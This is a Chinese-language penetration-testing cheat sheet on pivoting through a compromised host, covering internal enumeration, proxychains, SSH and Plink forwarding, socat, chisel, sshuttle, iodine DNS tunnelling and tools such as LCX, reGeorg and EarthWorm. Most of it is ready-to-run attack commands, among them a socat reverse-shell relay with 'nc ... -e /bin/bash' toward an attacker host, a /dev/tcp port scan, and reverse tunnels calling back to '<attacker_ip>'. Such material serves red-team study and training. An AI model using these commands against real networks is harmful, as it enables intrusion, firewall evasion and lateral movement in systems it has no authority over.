
#### 目录
- [跳板机枚举](#跳板机枚举-enumerating-from-the-pivot-host)
- [Proxychains 与 FoxyProxy](#代理工具proxychains-与-foxyproxy)
- [SSH 隧道与端口转发](#ssh-隧道与端口转发)
- [瑞士军刀：Socat](#瑞士军刀socat)
- [现代隧道工具：Chisel](#现代隧道工具chisel)
- ["VPN over SSH": sshuttle](#vpn-over-ssh-sshuttle)
- [DNS 隧道](#dns-隧道-dns-tunneling)
- [其他常用跳板工具](#其他常用跳板工具-other-common-pivoting-tools)

#### 概述：什么是跳板攻击？ (Overview: What is Pivoting?)

跳板攻击 (Pivoting) 是在获得一个网络的初始立足点（即攻陷一台主机）后，利用这台主机作为“跳板”来访问和攻击同一网络中其他无法从外部直接访问的主机的过程。

##### 核心技术 (Core Techniques)

1. **隧道/代理 (Tunneling/Proxying)**: 通过受感染的主机创建一个代理，将你本机的攻击工具（如 Nmap, Metasploit）的流量路由到目标内网。
    
2. **端口转发 (Port Forwarding)**: 在你的攻击机和内网的某个特定目标主机之间，通过跳板机建立一个点对点的连接通道。
    

#### 跳板机枚举 (Enumerating from the Pivot Host)

在发起进一步攻击前，必须先从已攻陷的跳板机上对内网进行信息收集。

- **使用主机上的材料**:
    
    - **ARP 缓存**: `arp -a` (显示主机最近通信过的其他主机的 IP 和 MAC 地址)。
        
    - **Hosts 文件**: `C:\Windows\System32\drivers\etc\hosts` (Windows) 或 `/etc/hosts` (Linux)，可能包含静态的 DNS 记录。
        
    - **DNS 配置**: `ipconfig /all` (Windows) 或 `cat /etc/resolv.conf` (Linux)，用于识别内部 DNS 服务器。
        
- **使用 Shell 脚本技术**:
    
    - **Bash Ping 扫描**:
        
        Bash
        
        ```
        for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
        ```
        
    - **Bash 端口扫描**:
        
        Bash
        
        ```
        for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
        ```
        
- **使用静态编译的工具**:
    
    - **原理**: 静态二进制文件是将所有依赖库都编译进自身的可执行文件，使其不依赖目标系统的库文件，从而具有极高的可移植性。这是在未知环境中运行自备工具的最佳方式。
        
    - **资源**: [andrew-d/static-binaries](https://github.com/andrew-d/static-binaries), [static-toolbox](https://github.com/ernw/static-toolbox)
        

#### 代理工具：Proxychains 与 FoxyProxy

##### Proxychains

`Proxychains` 是一款命令行工具，可以强制任何 TCP 应用程序的流量通过代理。

- **使用方法**:
    
    Bash
    
    ```
    proxychains nmap -sT -p 80,443 172.16.0.10
    ```
    
- **配置文件 (`/etc/proxychains.conf`)**:
    
    - **查找顺序**: `Proxychains` 会依次在 `./proxychains.conf`, `~/.proxychains/proxychains.conf`, `/etc/proxychains.conf` 查找配置文件。
        
    - **代理列表**: 在文件底部的 `[ProxyList]` 部分，设置你的代理服务器地址和端口（例如，SOCKS5 代理在本地的 1080 端口）。
        
        ```
        [ProxyList]
        socks5  127.0.0.1 1080
        ```
        
    
    > **重要提示**: 在使用 `proxychains` 运行 `nmap` 之前，**必须**注释掉配置文件中的 `proxy_dns` 这一行，否则会导致扫描挂起。此外，通过 `proxychains` 只能进行 TCP 扫描（如 `-sT`），不能进行 UDP 或 SYN 扫描，并且必须使用 `-Pn` 来禁用主机发现。
    

##### FoxyProxy

FoxyProxy 是一款浏览器扩展，用于方便地管理和切换浏览器代理。在需要通过跳板机访问内网 Web 应用时非常有用。

1. 在扩展选项中，点击“添加”。
    
2. 填写代理的 IP、端口和类型（如 SOCKS5）。
    
3. 保存后，即可在浏览器工具栏中快速启用或禁用该代理。
    

#### SSH 隧道与端口转发

如果跳板机上运行着 SSH 服务，SSH 是实现跳板攻击最强大、最灵活的工具。

##### 正向连接 (Forward / "Local" Connections)

从你的攻击机发起连接到跳板机。

- **端口转发 (`-L`)**: 将你本机的某个端口映射到内网目标的某个端口。
    
    Bash
    
    ```
    # 将本机的 8000 端口转发到内网 172.16.0.10 的 80 端口
    # -f: 后台运行, -N:不执行远程命令
    ssh -L 8000:172.16.0.10:80 user@<pivot_ip> -fN
    ```
    
    之后，访问你本机的 `localhost:8000` 就相当于访问了内网目标的 `172.16.0.10:80`。
    
- **SOCKS 代理 (`-D`)**: 在你本机创建一个 SOCKS 代理，将所有通过该代理的流量都转发到内网。
    
    Bash
    
    ```
    # 在本机的 1337 端口创建一个 SOCKS 代理
    ssh -D 1337 user@<pivot_ip> -fN
    ```
    
    之后，配置 `proxychains.conf` 使用 `socks4 127.0.0.1 1337`，即可将任何工具的流量路由到内网。
    

##### 反向连接 (Reverse Connections)

从跳板机发起连接到你的攻击机。适用于跳板机位于防火墙后，无法从外部直接访问的场景。

1. **准备攻击机**:
    
    - 生成一对**专用于此次任务的** SSH 密钥: `ssh-keygen`。
        
    - 将公钥内容添加到你攻击机的 `~/.ssh/authorized_keys` 文件中，并添加严格的限制，确保该密钥**只能用于端口转发，不能用于登录**。
        
        ```
        command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa AAAAB3...
        ```
        
    - 确保你攻击机上的 SSH 服务正在运行: `sudo systemctl start ssh`。
        
2. **在跳板机上执行**:
    
    - 将第一步生成的**私钥**安全地传输到跳板机上。
        
    - 执行反向端口转发 (`-R`) 或反向 SOCKS 代理 (`-R`) 命令。
        
        Bash
        
        ```
        # 将攻击机的 8000 端口转发到内网 172.16.0.10 的 80 端口
        ssh -R 8000:172.16.0.10:80 attacker_user@<attacker_ip> -i <private_key> -fN
        ```
        

##### Plink.exe (Windows 上的 SSH 隧道)

`plink.exe` 是 PuTTY 的命令行版本，可用于在 Windows 跳板机上建立反向连接。

- **转换密钥**: `plink` 使用 `.ppk` 格式的私钥，需要使用 `puttygen` 将 OpenSSH 格式的私钥进行转换。
    
    Bash
    
    ```
    puttygen <openssh_private_key> -o <output_key.ppk>
    ```
    
- **命令**:
    
    Code snippet
    
    ```
    :: "echo y" 用于在非交互式 shell 中自动接受主机密钥
    cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 user@<attacker_ip> -i key.ppk -N
    ```
    

#### 瑞士军刀：Socat

`socat` 是一款功能极其强大的网络工具，被誉为“网络工具中的瑞士军刀”，可以用于建立各种类型的连接和中继。

- **反向 Shell 中继**:
    
    1. **攻击机**: `sudo nc -lvnp 443`
        
    2. **跳板机**:
        
        Bash
        
        ```
        ./socat tcp-l:8000 tcp:<attacker_ip>:443 &
        ```
        
    3. **内网另一台机器**: `nc 127.0.0.1 8000 -e /bin/bash`
        
- **端口转发**:
    
    - **简单方式 (在跳板机上打开监听端口)**:
        
        Bash
        
        ```
        ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
        ```
        
        之后，连接跳板机的 33060 端口，流量就会被转发到内网目标的 3306 端口。
        
    - **静默方式 (不在跳板机上打开外部监听端口)**:
        
        1. **攻击机**:
            
            Bash
            
            ```
            # 创建本地中继
            socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
            ```
            
        2. **跳板机**:
            
            Bash
            
            ```
            # 连接攻击机的 8001 端口和内网目标的 80 端口
            ./socat tcp:<attacker_ip>:8001 tcp:172.16.0.10:80,fork &
            ```
            
            之后，访问你攻击机上的 `localhost:8000` 即可访问内网目标的 80 端口。
            

#### 现代隧道工具：Chisel

`Chisel` 是一款基于 Go 语言开发的、通过 HTTP 传输的快速 TCP/UDP 隧道工具。它不依赖 SSH，仅需在客户端和服务器上运行对应的二进制文件。

- **反向 SOCKS 代理 (最常用)**:
    
    1. **攻击机 (服务器)**:
        
        Bash
        
        ```
        # --reverse 允许客户端指定转发规则
        ./chisel server -p <listen_port> --reverse &
        ```
        
    2. **跳板机 (客户端)**:
        
        Bash
        
        ```
        ./chisel client <attacker_ip>:<listen_port> R:socks &
        ```
        
        默认情况下，SOCKS 代理会开在客户端（跳板机）的 `127.0.0.1:1080` 端口上。你需要配置 `proxychains.conf` 使用 `socks5 127.0.0.1 1080`。
        
- **远程 (反向) 端口转发**:
    
    1. **攻击机 (服务器)**: 同上。
        
    2. **跳板机 (客户端)**:
        
        Bash
        
        ```
        # R:<local_port>:<target_ip>:<target_port>
        ./chisel client <attacker_ip>:<listen_port> R:2222:172.16.0.10:22 &
        ```
        
        这会将内网 `172.16.0.10:22` 转发到你攻击机的 `2222` 端口。
        

#### "VPN over SSH": sshuttle

`sshuttle` 通过 SSH 连接创建一个类似 VPN 的透明代理，它会修改你本机的路由表，让你能够直接像访问本地网络一样访问目标内网，而无需为每个工具配置 `proxychains`。

- **限制**: 目标跳板机必须是 **Linux** 系统，并且安装了 **Python**。
    
- **基本命令**:
    
    Bash
    
    ```
    # -r: 指定 user@host, 后面跟上要转发的子网
    sshuttle -r user@<pivot_ip> 172.16.0.0/24
    ```
    
- **使用私钥**:
    
    Bash
    
    ```
    sshuttle -r user@<pivot_ip> --ssh-cmd "ssh -i <private_key>" 172.16.0.0/24
    ```
    
- **排除跳板机自身 (解决 "Broken pipe" 错误)**:
    
    Bash
    
    ```
    sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
    ```

#### DNS 隧道 (DNS Tunneling)

**什么是 DNS 隧道？**

DNS 隧道是一种更高级的技术，它将其他网络协议（如 SSH, HTTP, RDP）的流量**封装**在 DNS 查询和响应中。这使得攻击者能够绕过严格的防火墙规则，在受限网络和互联网之间建立一个功能齐全的隐蔽通信通道。

###### 实战演练 (`iodine`)

1. **DNS 配置**: 确保有一个 NS 记录指向运行 `iodined` 的攻击者机器（如 `att.tunnel.com` 指向攻击者 IP）。
    
2. **攻击者机器 (运行 `iodined` 服务器)**:
    
    Bash
    
    ```
    # -f: 前台运行
    # -c: 禁止检查客户端源 IP
    # -P: 设置隧道连接密码
    # 10.1.1.1/24: 为隧道分配的虚拟子网
    # att.tunnel.com: 客户端将查询此域名
    sudo iodined -f -c -P <tunnel_password> 10.1.1.1/24 att.tunnel.com
    ```
    
    成功后，服务器会创建一个名为 `dns0` 的虚拟网络接口，IP 为 `10.1.1.1`。
    
3. **受害者/跳板机 (运行 `iodine` 客户端)**:
    
    Bash
    
    ```
    sudo iodine -P <tunnel_password> att.tunnel.com
    ```
    
    成功后，客户端的 `dns0` 接口会被分配一个 IP (如 `10.1.1.2`)。
    
4. **通过 DNS 隧道建立 SSH SOCKS 代理**:
    
    - 在你的攻击机上，通过隧道的虚拟 IP (`10.1.1.2`) SSH 到跳板机，并使用 `-D` 参数创建一个动态 SOCKS 代理。
        
        Bash
        
        ```
        # -D 1080: 在本地 1080 端口创建 SOCKS 代理
        # -f: 后台运行
        # -N: 不执行远程命令
        ssh user_on_jumpbox@10.1.1.2 -4 -f -N -D 1080
        ```
        
5. **通过 SOCKS 代理访问目标网络**:
    
    - 配置本地工具 (如 `proxychains`) 或浏览器使用 SOCKS5 代理 `127.0.0.1:1080`。
        
        Bash
        
        ```
        proxychains curl http://<internal_target_ip>/demo.php
        ```
        
    
    现在，你所有的流量都会被 SSH 加密，然后通过 DNS 隧道传输，对于外部防火墙来说，这看起来只是普通的 DNS 查询和响应。

#### 其他常用跳板工具 (Other Common Pivoting Tools)

##### 1. LCX

- **简介**: 经典的端口转发工具，小巧但特征明显，易被现代杀毒软件查杀。
    
- **常用场景**:
    
    - **内网端口转发到公网 (反向连接)**:
        
        - **攻击者 VPS**: `lcx.exe -listen <VPS监听端口1> <VPS转发端口2>`
            
        - **内网跳板机**: `lcx.exe -slave <公网VPS_IP> <VPS转发端口2> 127.0.0.1 3389`
            
        - **效果**: 攻击者连接 `VPS_IP:<VPS监听端口1>` 即可访问内网跳板机的 3389 端口。
            

##### 2. Netcat (nc)

- **简介**: 网络工具中的“瑞士军刀”，可用于简单的端口转发。
    
- **端口转发示例 (简单管道)**: 在跳板机上执行，将访问跳板机监听端口的流量转发到内网目标。
    
    Bash
    
    ```
    # Linux
    nc -lvp <跳板机监听端口> -c "nc <内网目标IP> <内网目标端口>"
    # Windows (旧版 nc)
    nc.exe -lvp <跳板机监听端口> -e "nc.exe <内网目标IP> <内网目标端口>"
    ```
    
- **注意**: 流量未加密，功能相对基础。
    

##### 3. reDuh (HTTP/S 端口转发)

- **简介**: 利用 HTTP/S 协议进行端口转发，可以穿透只允许 HTTP/S 流量出站的网络环境。
    
- **工作流程**:
    
    1. 上传服务端脚本 (`reDuh.php`, `.aspx` 等) 到作为跳板机的 Web 服务器。
        
    2. 攻击者本地运行客户端 (`reDuhClient.jar`) 并连接到 Web 服务器上的脚本 URL。
        
    3. 通过客户端创建端口转发规则。
        

##### 4. reGeorg (SOCKS over HTTP/S)

- **简介**: 将 SOCKS 代理流量封装在 HTTP/S 请求中，隐蔽性较好。
    
- **工作流程**:
    
    1. 上传隧道脚本 (`tunnel.php`, `.aspx`, `.jsp`) 到作为跳板机的 Web 服务器。
        
    2. 攻击者本地运行 Python 客户端，建立本地 SOCKS 监听端口。
        
        Bash
        
        ```
        python reGeorgSocksProxy.py -p <本地SOCKS监听端口> -u <隧道脚本URL>
        ```
        
    3. 配置本地代理工具 (如 Proxychains) 使用该 SOCKS 代理 (`127.0.0.1:<本地SOCKS监听端口>`)。
        

##### 5. EarthWorm (ew)

- **简介**: 功能强大的跨平台网络穿透工具，支持正向/反向 SOCKS 代理、端口转发、多级级联等。
    
- **常用模式**:
    
    - **正向 SOCKS 代理**: 在内网跳板机启动 SOCKS 服务。
        
        Bash
        
        ```
        ew -s ssocksd -l <监听端口>
        ```
        
    - **反弹 SOCKS 代理 (推荐)**:
        
        - **攻击者 VPS**:
            
            Bash
            
            ```
            # 监听来自跳板机的 SOCKS 连接，并在本地 1080 端口提供代理服务
            ew -s rcsocks -l 1080 -e 8888
            ```
            
        - **内网跳板机**:
            
            Bash
            
            ```
            # 将 SOCKS 代理功能反弹给 VPS
            ew -s rssocks -d <VPS_IP> -e 8888
            ```
            
        - **效果**: 配置 Proxychains 使用 `VPS_IP:1080` 即可访问内网。
            

##### 6. 其他工具

- **FRP**: [https://github.com/fatedier/frp](https://github.com/fatedier/frp)
    
- **NPS**: [https://github.com/ehang-io/nps](https://github.com/ehang-io/nps)
    
- **Venom**: [https://github.com/Dliv3/Venom](https://github.com/Dliv3/Venom)
    
- **Iodine (DNS Tunneling)**: [https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)